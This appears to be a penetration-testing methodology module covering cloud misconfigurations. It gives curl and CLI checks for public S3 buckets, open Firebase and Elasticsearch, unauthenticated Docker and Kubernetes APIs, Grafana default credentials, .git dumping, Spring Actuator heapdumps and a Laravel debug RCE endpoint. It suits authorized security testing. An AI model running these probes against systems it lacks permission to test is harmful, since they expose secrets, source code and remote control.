# VULN MODULE — Cloud & Infrastructure Misconfiguration
# Asset: webapp / all
# CWE-732 | Report prefix: WEB-CLOUD

## COVERS

S3 bucket misconfiguration, exposed cloud storage, GCP/Azure bucket ACLs,
Firebase open databases, Elasticsearch/Kibana exposure, Docker API exposure,
Kubernetes dashboard, Grafana default creds, exposed .git directory.

## S3 BUCKET

```bash
# Check if bucket is publicly listable
aws s3 ls s3://bucket-name --no-sign-request
curl -s https://bucket-name.s3.amazonaws.com/

# Check write access
aws s3 cp /tmp/test.txt s3://bucket-name/test.txt --no-sign-request
# If upload succeeds → public write access

# Find S3 buckets from target domain
# Extract from: JS files, HTML source, CORS responses, error messages
grep -r "s3\.amazonaws\.com\|s3-[a-z].*amazonaws" ./src --include="*.js" --include="*.html"

# Bucket enumeration from company name
for name in company company-dev company-staging company-backup company-assets; do
  aws s3 ls s3://$name --no-sign-request 2>/dev/null && echo "FOUND: $name"
done
```

## FIREBASE

```bash
# Open Firebase Realtime Database
curl -s "https://project-name.firebaseio.com/.json"
# If returns data → unauthenticated access

# Firebase rules check
curl -s "https://project-name.firebaseio.com/.settings/rules.json"

# Firestore
curl -s "https://firestore.googleapis.com/v1/projects/PROJECT/databases/(default)/documents/COLLECTION"
```

## EXPOSED SERVICES

```bash
# Elasticsearch (unauthenticated)
curl -s https://target.com:9200/_cat/indices
curl -s https://target.com:9200/_all/_search?size=1

# Kibana
curl -s https://target.com:5601/api/saved_objects/_find?type=dashboard

# Docker API (unauthenticated)
curl -s http://target.com:2375/info
curl -s http://target.com:2375/containers/json
# If responds → full Docker control (RCE via container exec)

# Kubernetes dashboard
curl -s https://target.com:8001/api/v1/namespaces

# Grafana default credentials
curl -s -u admin:admin https://target.com:3000/api/org
```

## EXPOSED .git DIRECTORY

```bash
# Check if .git is exposed
curl -s https://target.com/.git/HEAD
# If returns "ref: refs/heads/main" → source code dump possible

# Dump entire repository
pip install git-dumper
git-dumper https://target.com/.git ./dumped-repo

# Check for secrets in dumped repo
cd dumped-repo
trufflehog git file://. --only-verified
```

## MASS ASSIGNMENT / METADATA ENDPOINTS

```bash
# Spring Boot Actuator (common in Java apps)
curl -s https://target.com/actuator/env       # environment variables
curl -s https://target.com/actuator/heapdump  # memory dump
curl -s https://target.com/actuator/mappings  # all routes
curl -s https://target.com/actuator/beans     # all beans
# Full list: /actuator/httptrace, /logfile, /threaddump, /metrics

# Django debug mode
curl -s https://target.com/nonexistent-url    # if debug=True shows stack trace + settings

# Laravel debug
curl -s https://target.com/_ignition/execute-solution  # pre-auth RCE in old versions
```
